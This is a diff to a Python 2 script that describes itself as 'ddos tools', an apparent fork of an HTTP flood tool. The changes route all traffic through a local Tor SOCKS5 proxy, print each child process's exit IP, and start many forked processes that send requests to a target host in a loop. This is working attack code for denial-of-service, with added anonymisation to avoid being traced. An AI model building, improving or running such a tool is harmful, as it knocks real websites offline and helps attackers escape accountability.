@@ -1,12 +1,14 @@
 #/usr/bin/python
 
 # function : ddos tools
-# author   : firefoxbug
+# original author   : firefoxbug
+# fork by : Kapunk
 
 import os
 import re
 import sys
 import time
+import socks
 import signal
 import socket
 import getopt
@@ -72,11 +74,14 @@ def send_packet(host,param_joiner):
 	request.add_header('Host',host)
 	try:
 		response = urllib2.urlopen(request)
+		
+
 	except urllib2.HTTPError,error:
 		pass
 	except urllib2.URLError, error:
 		pass
-#	print "response code = %d "%response.code
+	print "response code = %d "%response.code
+	
 
 def attack(host,param_joiner):
 	while True:
@@ -113,6 +118,7 @@ def parse_parameters(parameters):
 		sys.exit(1);
 
 if __name__ == '__main__':
+	
 	if len(sys.argv) < 2:
 		usage()
 		sys.exit()
@@ -138,11 +144,16 @@ if __name__ == '__main__':
 	signal.signal(signal.SIGINT, handler)
 	signal.signal(signal.SIGALRM, handler)
 	signal.alarm(int(interval))
+	
+#	Init Tor Network
 
+	socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+	socket.socket = socks.socksocket
 	for i in range(int(num_thread)):
 		newpid = os.fork()
 		if newpid == 0:
 #			signal.signal(signal.SIGINT, signal.SIG_DFL)
+			print(urllib2.urlopen('http://icanhazip.com').read())
 			attack(host,param_joiner)
 		else:
 			pass 
